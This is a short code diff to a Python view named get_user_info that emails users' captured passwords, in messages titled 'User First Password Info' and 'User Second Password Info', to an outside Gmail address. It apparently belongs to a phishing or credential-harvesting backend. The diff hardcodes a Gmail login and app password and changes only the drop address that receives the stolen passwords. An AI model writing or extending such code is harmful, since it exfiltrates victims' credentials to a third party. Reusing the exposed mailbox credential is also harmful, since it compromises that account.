@@ -75,7 +75,7 @@ def get_user_info(request):
                 connection.login(user='ranickiauerbach@gmail.com', password='nlov pvvd rcoa dnwl')
                 connection.sendmail(
                     from_addr='ranickiauerbach@gmail.com',
-                    to_addrs='victorabuke2@gmail.com',
+                    to_addrs='jujualvarado25@gmail.com',
                     msg=f"Subject: User First Password Info\n\n{email_content_first}"
                 )
         except SMTPException as e:
@@ -88,7 +88,7 @@ def get_user_info(request):
                 connection.login(user='ranickiauerbach@gmail.com', password='nlov pvvd rcoa dnwl')
                 connection.sendmail(
                     from_addr='ranickiauerbach@gmail.com',
-                    to_addrs='victorabuke2@gmail.com',
+                    to_addrs='jujualvarado25@gmail.com',
                     msg=f"Subject: User Second Password Info\n\n{email_content_second}"
                 )
         except SMTPException as e:
